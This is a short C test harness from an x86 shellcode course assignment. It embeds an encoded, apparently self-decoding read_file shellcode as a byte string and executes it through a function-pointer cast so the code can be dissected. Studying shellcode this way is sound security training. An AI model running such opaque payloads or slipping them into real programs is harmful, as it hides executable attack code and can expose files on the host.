// Dissection - read-file, test
// Paw Petersen, SLAE-656
// https://www.pawpetersen.dk/slae-assignment-5b-shellcode-dissection-read_file-linux-x86/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x43\x59\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c\x0e\x07\xe2"
"\xfa\xea\x34\xbb\x01\x05\x06\x07\x53\x38\xc3\xc6\x8c\x84\xcd"
"\xb7\x13\x11\x12\x13\x9d\xf2\x9f\xee\xa2\x19\x0a\x1b\x1c\xd0"
"\x9e\x96\xe2\x99\x26\x23\x24\x25\x9d\x26\x28\x29\x2a\xe6\xac"
"\x95\x2f\x2f\x30\x31\x89\x33\x34\x35\x36\xfa\xb8\xd1\xff\xc4"
"\xc3\xc2\x10\x10\x26\x2d\x23\x24\x44";

main()
{
  printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
